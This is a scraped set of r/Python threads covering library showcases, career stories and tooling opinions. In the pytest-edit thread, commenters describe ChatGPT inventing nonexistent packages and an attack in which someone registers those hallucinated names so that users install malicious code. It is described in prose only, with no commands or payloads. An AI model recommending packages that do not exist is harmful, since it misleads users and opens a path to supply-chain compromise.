    "post_id": "1df1546",
    "post_score": "1",
    "post_time": "Thursday, June 13, 2024 at 6:02:55 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Vedo or PyVista?",
    "media": [],
    "post_content": "Hi guys! What are your experiences with Vedo or PyVista? Which one do you prefer? Did you have any specific issues which either of these libraries? I'm mostly interested in meshes and point clouds rendering.",
    "comments": [
        {
            "author": "stupid_design",
            "score": "2",
            "content": "Pyvista has some nice functionalities, I'm using it for point cloud analysis. I found it a bit unfortunate, that IO between different formats depends on further modules you have to import, so there is definitely room for improvement."
        }
    ]
},
{
    "post_author": "CompositePrime",
    "post_id": "1dj6q3w",
    "post_score": "6",
    "post_time": "Wednesday, June 19, 2024 at 4:03:39 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Trying to find this package",
    "media": [
        "https://www.reddit.com/r/Python/"
    ],
    "post_content": "I should have saved the post but maybe 4-6 months ago I was reading a post (I am pretty sure it was in r/Python) where someone created a package that creates a visual for data contained within a list. For example, let’s say I have a data frame where one of the columns is named “colors” and each record contains a list of colors. One record might be [black,blue,yellow] another record might have [blue,yellow,black]. The visual had two parts where the top was a column chart to show the frequency of the list combinations and below the column chart was more of a table that showed each “color” as one column and then across the row for each color and under the columns from the chart above was an indicator of sorts that would be greyed out of the color for that row was not in the corresponding columns list and highlighted another color of it was. Anyways this is probably a long shot but either the package or the name of this visual would be super helpful. Thanks python community!",
    "comments": [
        {
            "author": "thedeepself",
            "score": "3",
            "content": "The holoviz community should be able to help you out https://panel.holoviz.org/"
        },
        {
            "author": "richhoods",
            "score": "1",
            "content": "Microsoft Lida"
        }
    ]
},
{
    "post_author": "driscollis",
    "post_id": "isbjm4",
    "post_score": "3742",
    "post_time": "Monday, September 14, 2020 at 4:48:41 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "I am excited to share my 8th published book, Python 101, geared for beginners and intermediate level readers",
    "media": [
        "https://preview.redd.it/jsla1w1pq0n51.jpg?width=640&crop=smart&auto=webp&s=59098d2271dc13404c89e3a7f06b0660dcdcced8",
        "https://i.redd.it/jsla1w1pq0n51.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "gmavrik",
            "score": "286",
            "content": "Since Reddit gave me this opportunity to do this personally, I would like to thank you for the many times you helped me (even without knowing it) to solve my bugs in python (and, of course, 80% were about wx). Your blog, book, and your stack overflow account have saved me from hours of debugging and trying to solve my daily problems. Mike, thank you very much! I wish you a lot of success in your career and in your new book. P.S: Hey Redditors, if you don't know this guy, I suggest you go to his website (https://www.blog.pythonlibrary.org/), for sure you will learn a lot about python.",
            "replies": [
                {
                    "author": "driscollis",
                    "score": "85",
                    "content": "Thanks so much! I'm always happy to meet my readers. It's also exciting to meet another wxPython enthusiast. I'm happy my articles and other posts have helped you out.",
                    "replies": [
                        {
                            "author": "gmavrik",
                            "score": "17",
                            "content": "I discovered your blog since 2014, and I often visit to learning something new. WxPython has helped me a lot either professionally, academically or in hobbies. Considering that I use python for about 7 years and wxpython for about 6 years, your material is better than I ever found!"
                        }
                    ]
                }
            ]
        },
        {
            "author": "__unavailable__",
            "score": "43",
            "content": "Weird that you started with 94 but respect all the same!"
        },
        {
            "author": "RachelMaddog",
            "score": "42",
            "content": "I like the cover art",
            "replies": [
                {
                    "author": "driscollis",
                    "score": "26",
                    "content": "Thanks. I like to make all my covers unique and interesting"
                }
            ]
        }
    ]
},
{
    "post_author": "Specialist-Arachnid6",
    "post_id": "1dgpg4g",
    "post_score": "52",
    "post_time": "Saturday, June 15, 2024 at 10:22:30 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made a cool calendar app with PyQt6",
    "media": [
        "https://github.com/rohankishore/Tempus"
    ],
    "post_content": "Tempus is a calendar with horoscopes, reminders, etc made with PyQt6\nWhat my Project does?\nTempus is a desktop-based calendar management application built with PyQt6, allowing users to manage their todos, reminders, and special dates efficiently. It offers features like adding, editing, and deleting tasks and reminders, as well as marking dates as special. Tempus ensures users stay organized and never miss important events. Plus, it shows you how many days are remaining until a special day in the dashboard.\nTarget Audience\nWell, anyone who uses a desktop calendar app I guess?\nComparison\nI did some research and couldn't find good calendar apps made with PyQt6. If you guys knows any, please mention it below and I'm sorry in advance.\nGitHub\nhttps://github.com/rohankishore/Tempus",
    "comments": [
        {
            "author": "sylecn",
            "score": "33",
            "content": "Looks cool and polished. Side note: You made it MIT license, but pyqt6 uses GPLv3. There might be a conflict. It's much safer to just use GPLv3 if you just want to share it.",
            "replies": [
                {
                    "author": "Specialist-Arachnid6",
                    "score": "10",
                    "content": "Noted! Thanks a lot 😊"
                }
            ]
        },
        {
            "author": "One_Square8240",
            "score": "6",
            "content": "Awesome project. I loved the simplicity of the UI. Any consideration about integrating your app with third party calendars like google calendar or Microsoft? Probably other apps already do that, but still a cool think to learn and add. Besides that congratulations.",
            "replies": [
                {
                    "author": "Specialist-Arachnid6",
                    "score": "3",
                    "content": "Yep! I'm planning to add Google Calendar first. Then Microsoft."
                }
            ]
        },
        {
            "author": "athermop",
            "score": "6",
            "content": "Can you describe why you used PyQT6 rather than PySide?",
            "replies": [
                {
                    "author": "Specialist-Arachnid6",
                    "score": "5",
                    "content": "No particular reason tbh. I'm just more used to PyQt6. And also, the qfluentwidgets library works better with qt6"
                }
            ]
        },
        {
            "author": "KRex228",
            "score": "2",
            "content": "Thanks for sharing - this is really cool. I'm learning a lot reading through your code.",
            "replies": [
                {
                    "author": "Specialist-Arachnid6",
                    "score": "1",
                    "content": "Thanks a lot 😊"
                }
            ]
        },
        {
            "author": "yrubooingmeimryte",
            "score": "2",
            "content": "What would be the advantage of using this over other planners?",
            "replies": [
                {
                    "author": "Specialist-Arachnid6",
                    "score": "4",
                    "content": "Well for one, you get daily horoscopes (haven't seen that in other PC calendars or maybe I'm wrong?) + its open source?"
                }
            ]
        }
    ]
},
{
    "post_author": "Character-Maybe-4400",
    "post_id": "1dchk4g",
    "post_score": "549",
    "post_time": "Monday, June 10, 2024 at 12:38:49 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "ChatGPT hallucinated a plugin called pytest-edit. So I created it.",
    "media": [
        "https://github.com/MrMino/pytest-edit"
    ],
    "post_content": "I have several codebases with around 500+ different tests in each. If one of these tests fails, I need to spend ~20 seconds to find the right file, open it in neovim, and find the right test function. 20 seconds might not sound like much, but trying not to fat-finger paths in the terminal for this amount of time makes my blood boil.\nI wanted Pytest to do this for me, thought there would be a plugin for it. Google brought up no results, so I asked ChatGPT. It said there's a pytest-edit plugin that adds an --edit option to Pytest.\nThere isn't. So I created just that. Enjoy. https://github.com/MrMino/pytest-edit\nNow, my issue is that I don't know if it works on Windows/Mac with VS Code / PyCharm, etc. - so if anyone would like to spend some time on betatesting a small pytest plugin - issue reports & PRs very much welcome.\nWhat My Project Does\nIt adds an --edit option to Pytest, that opens failing test code in the user's editor of choice.\nTarget Audience\nPytest users.\nComparison\nAFAIK nothing like this on the market, but I hope I'm wrong.\nThink %edit magic from IPython but for failed pytest executions.",
    "comments": [
        {
            "author": "Spiderfffun",
            "score": "423",
            "content": "That's genuinely awesome, \"oh LLM thought something exists, well I'll just make it\"",
            "replies": [
                {
                    "author": "Maximum59",
                    "score": "413",
                    "content": "A conference I attended recently, a keynote focused on security, actually mentioned how this could be abused and to look out for cases like this. I'm not saying this is one such case, but interesting, nonetheless. Ask LLM if a package to do <thing> exists. LLM \"hallucinates\" a package and gives you a name for it. The attacker creates said package, hoping for LLM to continue suggesting it and for people to trust the LLM and install it.",
                    "replies": [
                        {
                            "author": "Gamecrazy721",
                            "score": "92",
                            "content": "Wait, so I shouldn't just pip install everything GPT tells me to? Joking aside, that would be a pretty clever attack. Just shows how important it is to understand what you're doing and keep a close eye on anything that can modify your system, even if you think it's from a trusted source",
                            "replies": [
                                {
                                    "author": "BerriesAndMe",
                                    "score": "11",
                                    "content": "I suspect the target base would be too small for it to really be lucrative as a generic attack. But for a targeted attack this could be pretty wicked"
                                }
                            ]
                        },
                        {
                            "author": "GuybrushThreepwo0d",
                            "score": "120",
                            "content": "What a time to be alive"
                        },
                        {
                            "author": "BannedNeutrophil",
                            "score": "5",
                            "content": "I... would have been in danger of falling for that. ChatGPT has given me incredibly detailed instructions for R packages that don't exist."
                        },
                        {
                            "author": "masev",
                            "score": "4",
                            "content": "Step 4. The attacker posts on reddit asking folks to test said package...",
                            "replies": [
                                {
                                    "author": "Character-Maybe-4400",
                                    "score": "5",
                                    "content": "I can assure you, that given my credentials I have very little incentive for such shenanigans (negative amount, actually)."
                                }
                            ]
                        },
                        {
                            "author": "nguyenvulong",
                            "score": "1",
                            "content": "This is very similar to (adversarial) transferred attack, the surrogate model (presumably similar to the target model) is used to deduce the behaviors of the target model. The approach is different and much more intriguing though. Just my lame comparison: Surrogate model is ChatGPT Target model is Human (the brain, to be more precise). But these two model don't have to be similar in the case of adversarial attacks."
                        },
                        {
                            "author": "Ok-Alternative3612",
                            "score": "1",
                            "content": "may I ask the name of the conference? sounds pretty cool",
                            "replies": [
                                {
                                    "author": "Maximum59",
                                    "score": "1",
                                    "content": "It was \"DevOps Days\", don't recall the speaker's name but it was focused on security."
                                }
                            ]
                        },
                        {
                            "author": "mlcircle",
                            "score": "0",
                            "content": "just wow"
                        }
                    ]
                },
                {
                    "author": "AquaRegia",
                    "score": "105",
                    "content": "Hallucination Driven Development"
                }
            ]
        },
        {
            "author": "erez27",
            "score": "37",
            "content": "I tested, and it works on Windows 10, with vscode as editor. Nice one! It will come in handy. P.S. it does also print out ERROR: exit() requires a reason argument, but that's an easy fix.",
            "replies": [
                {
                    "author": "Character-Maybe-4400",
                    "score": "14",
                    "content": "Thanks for trying it out! None of what you've just tried was tested by me, so I'm genuinely surprised this works 😁. Yes, the exit thing is something I need to work out. Pytest API doesn't really have a \"please silently exit the process now\" method, or I can't find it. I'm in the process of weighing which hack is the least ugly."
                }
            ]
        },
        {
            "author": "fellipec",
            "score": "55",
            "content": "ChatGPT in full \"follow your dreams\" or \"where is a will, there is away\" mode"
        },
        {
            "author": "I1lII1l",
            "score": "74",
            "content": "ChatGPT did not hallucinate, since version 4 it can legit foresee the future.",
            "replies": [
                {
                    "author": "That_0ne_again",
                    "score": "20",
                    "content": "ChatGPT in “prophetic visions” mode."
                }
            ]
        },
        {
            "author": "jackerhack",
            "score": "7",
            "content": "I solved this for myself a while ago. In conftest.py: def pytest_runtest_logreport(report: pytest.TestReport) -> None: \"\"\"Add line numbers to log report, for easier discovery in code editors.\"\"\" # Report location of test (failing line number if available, else test location) filename, line_no, domain = report.location if ( report.longrepr is not None and (repr_traceback := getattr(report.longrepr, 'reprtraceback', None)) is not None and (repr_file_loc := repr_traceback.reprentries[0].reprfileloc).path == filename ): line_no = repr_file_loc.lineno if report.nodeid.startswith(filename): # Only insert a line number if the existing `nodeid`` refers to the same # filename. Needed for pytest-bdd, which constructs tests and refers the # filename that imported the scenario. This file will not have the actual test # function, so no line number reference is possible; the `filename` in the # report will refer to pytest-bdd internals report.nodeid = f'{filename}:{line_no}::{domain}'"
        },
        {
            "author": "Abitconfusde",
            "score": "4",
            "content": "Doesn't Ctrl-click on the line number do this with VScode?"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1dj5f2u",
    "post_score": "4",
    "post_time": "Wednesday, June 19, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Wednesday Daily Thread: Beginner questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Hydr0genMC",
            "score": "2",
            "content": "Heyyo! Really early beginner here. What are some easy projects I can start to apply some of the basics in Python? How is using Python for Arduinos? Thanks in advance!",
            "replies": [
                {
                    "author": "trd1073",
                    "score": "1",
                    "content": "There are many videos on YouTube demonstrating micro python on YouTube. Do a search, should a host or project that you find engaging than can help you get going."
                }
            ]
        }
    ]
},
{
    "post_author": "romerio86",
    "post_id": "1de2llp",
    "post_score": "188",
    "post_time": "Wednesday, June 12, 2024 at 12:37:11 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Sold my Python open source project to a San Francisco AI company. Now I work for them. AMA.",
    "media": [
        "https://www.reddit.com/r/python/",
        "https://github.com/writer/writer-framework",
        "https://www.reddit.com/r/opensource/"
    ],
    "post_content": "About a year ago, I posted on this sub. I was terrified. I was launching a new framework. Another framework? Yes, I was crazy enough to think we needed yet another framework. Thankfully, the response was great. Many were excited to try it. Others were understandably skeptical, and respectfully asking good questions.\nThis time, I'm posting for completely different reasons. I want to share a story. A story of which this sub, and hundreds of you, are part.\nIt all started 2 years ago, when I was laid off from my analytics consulting job. I had a well-paying, comfortable job in the UK. Then I moved from the UK to Poland, where I live now, and continued working remotely. I was living the dream; earning a London salary while living in a place with a lower cost of living. Until it ended with a layoff.\nI thought, this is it. My career is dead. I didn't speak Polish properly, limiting my options. And finding another fully remote job working for the UK sounded overly optimistic at the time. Being in my mid 30s and with a family to support, I didn't want to start over again.\nI knew Python and data analytics quite well, and also had frontend skills I had gained throughout the years. So I thought... I need to show what I can do. I didn't have a portfolio at all; my GitHub was empty. After trying Streamlit, I thought the concept was great, but the execution wasn't. So I wrote an article on Medium, discussing how a better, faster alternative was possible. I also created a POC and shared it on GitHub.\nThankfully, due to contacts at my previous job, I was able to find another remote job, working for the UK w. With even better pay. So naturally, I forgot about my portfolio-building efforts. But after a few months, an investor (VC) from Germany reached out to me. He had seen the Medium article and asked me whether I'd like to do this full time.\nI hesitated, but eventually decided to explore this further. I didn't need any investment though; my idea was quite simple. And to be honest, not too different from other frameworks, just faster. I had to think bigger. One day, at London Stansted Airport, while waiting to board a plane home, I decided to go for it and came up with the idea of no-code in the front, Python in the back. In other words, building the frontend using a visual editor, while allowing for full freedom in the backend using Python, and abstracting all the connectivity between.\nThe VC liked the idea, but wasn't fully convinced about my ability to execute. He decided not to invest. But since I liked the idea and thought it could go somewhere, I decided to try building it myself, at night, after work. For 9 months, that was my reality. Nights, weekends. If my baby son would wake up, early mornings too.\nIn May 2023, I managed to get the framework to a state I was happy with, and launched it. The response was very good. I eventually got to 1000 stars on GitHub, a milestone for any open source project. To a great extent, thanks to the support of communities such as r/python and r/opensource. Also, thanks to sites like Medium and Product Hunt.\nA few months later, in November 2023, the CTO of a multibillion AI company reached out to me. They wanted to acquire my framework, hire me, and build a team for me to continue developing it. I was ecstatic. He told me he'd go on a Thanksgiving break for a few days and that he'd reach out to me after. He never got back to me. Accepting that this wasn't going to happen was tough.\nTwo weeks later, the CTO of another AI company called me, together with the CEO. They also wanted to acquire me and make me a part of their team. A smaller company, much more interesting and already quite established, with clients such as Accenture and Salesforce. But with grit and determination to win in the space of enterprise generative AI. This time, it did work out and my framework was finally acquired. Now I work for them and I lead a team focused on maintaining this open source project. \nHappy to answer any questions. And THANK YOU for your support r/python!!!\nFor those curious:\nhttps://github.com/writer/writer-framework",
    "comments": [
        {
            "author": "nemom",
            "score": "15",
            "content": ""
        },
        {
            "author": "lostinfury",
            "score": "10",
            "content": "",
            "replies": [
                {
                    "author": "romerio86",
                    "score": "5",
                    "content": ""
                }
            ]
        },
        {
            "author": "Amgadoz",
            "score": "6",
            "content": "Congratulations! This is really helpful as I am going through a similar phase of developing yet another open source rag framework. I guess this is my sign! Thanks for sharing your story."
        },
        {
            "author": "SpareIntroduction721",
            "score": "6",
            "content": "Woah. Crazy stuff."
        },
        {
            "author": "Stash_pit",
            "score": "4",
            "content": "This is my dream too. I want to create an open source algorithm which will take notice!",
            "replies": [
                {
                    "author": "romerio86",
                    "score": "4",
                    "content": "I guess go for it? I had to try quite a few times before getting some success with something, but it was worth it every time. Best way to learn is to ship something that's polished and well documented."
                }
            ]
        },
        {
            "author": "nootropicMan",
            "score": "2",
            "content": "Amazing! Congrats! Was it worth selling? What would you of done if you hadn't sold?",
            "replies": [
                {
                    "author": "romerio86",
                    "score": "4",
                    "content": "Great question. I'm happy having sold, yes. I was close to burning out. The other alternative would have been looking for investment. The thing is, it wouldn't have been easy, and I was quite risk averse. So I'm glad the acquisition option appeared."
                }
            ]
        },
        {
            "author": "Desperate_Pumpkin168",
            "score": "2",
            "content": "Congratulations and good luck man. I also hope to create something like this in coming future"
        }
    ]
},
{
    "post_author": "JoachimCoenen",
    "post_id": "1dgmtbx",
    "post_score": "36",
    "post_time": "Saturday, June 15, 2024 at 8:18:56 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Better-OrderedMultiDict - a fast pure-pyton implementation of an ordered multi-valued dictionary.",
    "media": [
        "https://github.com/JoachimCoenen/Better-OrderedMultiDict",
        "https://pypi.org/project/orderedmultidict/",
        "https://pypi.org/project/better-orderedmultidict",
        "https://github.com/JoachimCoenen/Better-OrderedMultiDict/issues"
    ],
    "post_content": "What my project does\nIt provides a fast pure-python implementation of an ordered, multi-valued dictionary.\nTarget audience\nPython developers that need this kind of specialized functionality.\nThis can be used in production. It has no dependencies. The code is unit-tested (almost fully, I'm working on it) It requires Python 3.12+\nComparison\nComparison to dict and OrderedDict\ndict and OederedDict are already ordered, but they only allow one value per key. You could use a defaultdict of lists, but then you have these disadvantages:\nyou can end up with empty lists within the dict if you aren't careful\nyou lose the order of individual items within the dict:\nitems = [(1, '1'), (2, '2'), (2, '22'), (1, '11')]\nnormal_dict = defaultdict(list)\nfor key, value in items:\n    normal_dict [key].append(value)\nom_dict = OrderedMultiDict(items)\nprint(list(normal_dict .items)) # prints [(1, ['1', '11']), (2, ['2', '22'])] \nprint(list(om\\_dict.items))     # prints [(1, '1'), (2, '2'), (2, '22'), (1, '11')]\niterating over all key/value pairs can be cumbersome as you need nested loops\nComparison to omdict.\nOederedDict provides a (in my opinion) nicer interface with less surprising behavior or pitfalls. My implementation is also faster. e.g iterating over all items is ~5x faster.\nMore info\nThis started as a toy project, that later became useful to me, so I decided to cleanup the code, add tests, and publish it.\nfrom better_orderedmultidict import OrderedMultiDict\nomd: OrderedMultiDict[int, int] = OrderedMultiDict([(1,1), (2,2), (1,11), (2,22)])\n\nfor key in reversed(omd.unique_keys()):\n    print(f\"{key}: {omd.getall(key)}\")\n# prints:\n# 2: [2, 22]\n# 1: [1, 11]\n\nprint(omd.popfirstitem())  # prints: (1, 1)\nprint(omd.poplast(2))  # prints: 22\n\nfor key in reversed(omd.unique_keys()):\n    print(f\"{key}: {omd.getall(key)}\")\n# prints:\n# 2: [2]\n# 1: [11]",
    "comments": [
        {
            "author": "DigThatData",
            "score": "3",
            "content": "",
            "replies": [
                {
                    "author": "JoachimCoenen",
                    "score": "3",
                    "content": ""
                }
            ]
        }
    ]
},
{
    "post_author": "LAcuber",
    "post_id": "h9bfe4",
    "post_score": "3331",
    "post_time": "Monday, June 15, 2020 at 10:34:55 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Made a Screen Dimmer based on Facial Recognition with OpenCV and AppleScript!",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "Thika168",
            "score": "156",
            "content": "does this positively impact battery life ? cool script !",
            "replies": [
                {
                    "author": "LAcuber",
                    "score": "139",
                    "content": ""
                }
            ]
        },
        {
            "author": "gamebo11",
            "score": "61",
            "content": "",
            "replies": [
                {
                    "author": "LAcuber",
                    "score": "109",
                    "content": ""
                }
            ]
        },
        {
            "author": "basnijholt",
            "score": "30",
            "content": "Cool! So where is the code?"
        }
    ]
},
{
    "post_author": "mraza007",
    "post_id": "1dd6tud",
    "post_score": "0",
    "post_time": "Tuesday, June 11, 2024 at 8:45:03 AM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Building an HTTP Server in Python",
    "media": [
        "https://muhammadraza.me/2024/building-http-server/"
    ],
    "post_content": "I have always been curious on how http servers works. Therefore, I decided to write a post on how they work and implementing a simple server in Python.\nLink to blog post",
    "comments": [
        {
            "author": "snekk420",
            "score": "37",
            "content": "Not to be that guy but i think you should spend some time to actually implement the http protocol that supports headers and response content from actual html files. This is at most a tcp server that returns a string that looks like http.",
            "replies": [
                {
                    "author": "mraza007",
                    "score": "2",
                    "content": "I would agree and I really appreciate your opinion. Also that’s a good idea I might dive into writing HTTP protocol and understanding how it works"
                }
            ]
        },
        {
            "author": "echocage",
            "score": "5",
            "content": "This looks like a good beginner project, good on ya mate! I’d recommend digging into flask 2 or fastapi next so you can see how a full backend web framework works if you haven’t already. Fastapi is my preference personally but both work well. As you may know, while low level socket level control is interesting, it’s not very practically useful for the vast majority of cases in real enterprise web backends. What’s more useful is how you can build real systems using modern backend web frameworks, how you manage delayed workloads, how you integrate in your user authentication control framework, how you build systems that require no state to be stored at the server level but still allow you to serve your customers. I recommend working on building real business projects with FastAPI as that will give you a lot of really usable experience.",
            "replies": [
                {
                    "author": "mraza007",
                    "score": "2",
                    "content": "Hey I really appreciate your advice. Also that’s my plan , even though I program in python and now i want to learn things more deeply And write about them as this might help beginners who getting started in there programming journey or even web development. Comments like your really motivate me",
                    "replies": [
                        {
                            "author": "echocage",
                            "score": "2",
                            "content": "That’s great to hear. I’m a senior backend python engineer professionally, if you’d like, we can connect so you’ve got a place to answer career questions. Sometimes it can be helpful to have someone a little more experienced to bounce ideas off of. Feel free to send me a chat message on Reddit if that interests you. Either way, good luck mate! It’s not an easy career to get into, but it’s very rewarding once you get some traction.",
                            "replies": [
                                {
                                    "author": "mraza007",
                                    "score": "1",
                                    "content": "Sure, I’ll dm you"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "echocage",
            "score": "2",
            "content": "Site doesn’t load for me sadly",
            "replies": [
                {
                    "author": "mraza007",
                    "score": "0",
                    "content": "Maybe try again"
                }
            ]
        },
        {
            "author": "Prior_Sale8588",
            "score": "1",
            "content": "It was a fun project. I have done codecrafters's version (in multiple languages) https://app.codecrafters.io/courses/http-server/overview https://www.youtube.com/watch?v=1NiVabKE7Fk (this is not me)"
        }
    ]
},
{
    "post_author": "tavallaie",
    "post_id": "1djunb5",
    "post_score": "0",
    "post_time": "Thursday, June 20, 2024 at 12:30:44 AM GMT+3",
    "flair_text": "News",
    "post_title": "I am Nominating Myself for PSF Board of Directors",
    "media": [
        "https://blog.techbend.io/i-am-nominating-myself-for-psf-board-of-directors"
    ],
    "post_content": "I am nominating myself for the PSF Board of Directors! 🌟 Check out my latest blog post to learn more about my journey, my commitment to the Python community, and my application for an OFAC license to expand educational activities in restricted areas.\nRead more at my blog",
    "comments": [
        {
            "author": "DuckDatum",
            "score": "17",
            "content": "Why’s your account 19 minutes old?",
            "replies": [
                {
                    "author": "nicholashairs",
                    "score": "5",
                    "content": "It could also be that they wanted to separate their previous \"do anything\" account from one that will be used in a professional capacity. (Legitimate question though)"
                },
                {
                    "author": "buqr",
                    "score": "4",
                    "content": "Maybe because they didn't have a Reddit account before? This is a valid post for the sub. As bad as the nomination is, I think it's completely unfair to use that as a point against them, and feels pretty gatekeepy.",
                    "replies": [
                        {
                            "author": "DuckDatum",
                            "score": "4",
                            "content": "Sorry, guess I just expected to see more of a presence on Reddit if they decided to share their nomination on Reddit. I was a bit surprised to see what looks like a throwaway account, and a bit suspicious because this OP has a hyperlink to “my blog.” I went there anyway, and I like how he talks about wanting to bring more diversity to the topic. I guess I just wanted an explanation for why Reddit? Not necessarily why r/Python? He is welcome though. Anyone willing to participate in making things better is welcome. I am in no position to gatekeep and don’t want to.",
                            "replies": [
                                {
                                    "author": "tavallaie",
                                    "score": "4",
                                    "content": "I have another Reddit account, but I made this new one with my real last name for professional reasons. I nominated myself for the PSF Board, and after I finished, I thought it would be good to write about it and introduce myself. Hashnode suggested I share it on Reddit. Unfortunately, my submitted nomination is not publicly available yet. Because of the current situation in Iran, only a few of my friends and I can vote. So, I am sharing it with the wider community."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "buqr",
            "score": "5",
            "content": "Cool, it's good to have a wide range of people putting themselves forward for the board. I will say that, while I am not a PSF member and am not familiar with their voting criteria, I wouldn't say your nomination stands out as well as many from previous years (https://www.python.org/nominations/elections/2023-python-software-foundation-board/nominees/). More specifically, I'd say that your section on your experience seems quite vague and lacking, and it's not clear how you go above and beyond to contribute to the Python community. I also think you need to link your goals with the aims and abilities of the PSF. You mention internet access in other countries being an issue, but not what the PSF can do about it. Your nomination feels low quality enough that I'd guess you have almost no chance of getting on the board with it.",
            "replies": [
                {
                    "author": "tavallaie",
                    "score": "2",
                    "content": "thanks I will edit it to clarify it. Also, I know that I don't have any chance, I use this opportunity to tell the problem and what I think can be a solutions."
                }
            ]
        },
        {
            "author": "thisismyfavoritename",
            "score": "1",
            "content": "i am also nominating myself",
            "replies": [
                {
                    "author": "tavallaie",
                    "score": "1",
                    "content": "awsome! if you elected please consider my concerns."
                }
            ]
        }
    ]
},
{
    "post_author": "fzumstein",
    "post_id": "1de2hkw",
    "post_score": "93",
    "post_time": "Wednesday, June 12, 2024 at 12:29:13 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "My Thoughts on Python in Excel",
    "media": [
        "https://www.xlwings.org/blog/my-thoughts-on-python-in-excel"
    ],
    "post_content": "Hi all, it's been almost 1 year since the preview of Python in Excel has been revealed. So I wrote up a blog post pointing out what works well and what should be improved: https://www.xlwings.org/blog/my-thoughts-on-python-in-excel\nHere’s the TL;DR:\nWe wanted an alternative to VBA, but got an alternative to the Excel formula language\nIntegrating the Jupyter notebook cells inside the Excel grid was a mistake\nPython in Excel isn’t suitable for Python beginners nor for interactive data analysis\nRight now, there are too many restrictions (can’t use your own packages and can’t connect to web APIs)\nHere are the current use cases I see for Python in Excel:\nComputationally intensive things like Monte Carlo simulations\nAI stuff via the included packages (scikit-learn, nltk, statsmodels, imbalanced-learn, gensim)\nAdvanced visualizations via Matplotlib/Seaborn\nTime-series analysis (this is one of Excel’s blind spots)\nNot sure about data cleaning/data analysis: since you almost certainly need Power Query, it may actually be simpler and faster to just stick to Power Query (instead of using Power Query and Python in Excel together)",
    "comments": [
        {
            "author": "Qyxitt",
            "score": "138",
            "content": "OP may want to disclose here that they own the open-source project that ‘competes’ with Microsoft’s Python in Excel™. It’s pretty clear when you get to the blog post, but just for clarity here. Doesn’t make them wrong, though. Cloud only + additional subscription makes it DOA for me. I work for a large university and it would take moving heaven and earth to get it approved as an addition to the 365 license for me. Yeah, that’s a business practice issue, but it’s friction users are bound to run into. I was disappointed to see the implementation was within the spreadsheet itself, and not as a separate Jupyter notebook-style sheet in the workbook specifically for Python. Excel is weirdly crowded language-wise with the native syntax, VBA, M, Typescript, and now Python. Each with access to different (sometimes overlapping) elements of the software/object model. I’m left wondering when Microsoft will try to stuff their new Excel-inspired GPL, PowerFx, into Excel. Your point about the Excel syntax hits home too. Why can’t we create the rich data types in the sheet? Adding the lambda, pivotby, group by, and now regex also just makes me question what exactly they’re trying to accomplish here. What /is/ Excel supposed to be these days?",
            "replies": [
                {
                    "author": "fzumstein",
                    "score": "13",
                    "content": "Totally agree with all this and it's really what I am thinking, too :) I hope that my plans for xlwings Script will solve your issues (it'll be free for non-commercial use, runs locally, and maybe I can base it on JupyterLite)."
                }
            ]
        },
        {
            "author": "Cynyr36",
            "score": "20",
            "content": ""
        },
        {
            "author": "SpiderJerusalem42",
            "score": "10",
            "content": "I thought they were going to drop it python as a VBA replacement, but they use it for formulas? Nutty."
        },
        {
            "author": "gandalfx",
            "score": "9",
            "content": "IMHO spreadsheets are a very useful tool but once they reach the level of complexity where you need a programming language (no matter which) to solve a problem then that task has vastly outgrown the scope of a spreadsheet. In short: If you need Python, you no longer need Excel.",
            "replies": [
                {
                    "author": "No_Department_4475",
                    "score": "2",
                    "content": "Often for me, programming in excel is basically just getting a Microsoft rubber stamp for my program. At a large workplace I was at before, people wouldn't trust an actual program (even though python was approved by our organization) that I even took the time to do code signing for, but they were perfectly happy with an excel sheet that downloads an exe file in the background and runs it. So VBA is often just a workaround to either bad IT policy. With a straightforward process to submit/approve programs for use in your workplace that normal people could access, the need to use programming to make super complex excel sheets is greatly reduced or even eliminated in many cases."
                }
            ]
        },
        {
            "author": "kissekattutanhatt",
            "score": "15",
            "content": "Can you summarize your thoughts here?",
            "replies": [
                {
                    "author": "fzumstein",
                    "score": "20",
                    "content": "I added the TL;DR"
                }
            ]
        },
        {
            "author": "dnskjd",
            "score": "4",
            "content": "My 2 cents: Good alternative of UI for Python projects where application inputs change regularly",
            "replies": [
                {
                    "author": "adityaguru149",
                    "score": "4",
                    "content": "Have you tried ipydatagrid in jupyterlab?"
                }
            ]
        }
    ]
},
{
    "post_author": "SuperZooper3",
    "post_id": "j5a2ih",
    "post_score": "3648",
    "post_time": "Monday, October 5, 2020 at 3:47:07 AM GMT+3",
    "flair_text": "Meta",
    "post_title": "This great message",
    "media": [
        "https://i.redd.it/iyb4l795b6r51.png",
        "https://preview.redd.it/iyb4l795b6r51.png?width=640&crop=smart&auto=webp&s=c51f5184dd5f36947f30c86ae0437610a6675df6"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Blaidd-XIII",
            "score": "362",
            "content": "I somehow repeatedly read Mark Hamill, and could not figure out how he fit that in between star wars, batman, and avatar...",
            "replies": [
                {
                    "author": "got_outta_bed_4_this",
                    "score": "8",
                    "content": "I kept thinking John Hammond and thought, \"That's fitting.\"",
                    "replies": [
                        {
                            "author": "Blaidd-XIII",
                            "score": "6",
                            "content": "He spared no expense"
                        }
                    ]
                },
                {
                    "author": "dsorrells96",
                    "score": "36",
                    "content": "I did that to"
                },
                {
                    "author": "1945BestYear",
                    "score": "6",
                    "content": "I have watched his career with great interest."
                },
                {
                    "author": "mwpfinance",
                    "score": "9",
                    "content": "Same."
                },
                {
                    "author": "LazaroFilm",
                    "score": "3",
                    "content": "He uses the Bat-force bending.",
                    "replies": [
                        {
                            "author": "Blaidd-XIII",
                            "score": "0",
                            "content": "You won't believe how he got those scars!"
                        }
                    ]
                }
            ]
        },
        {
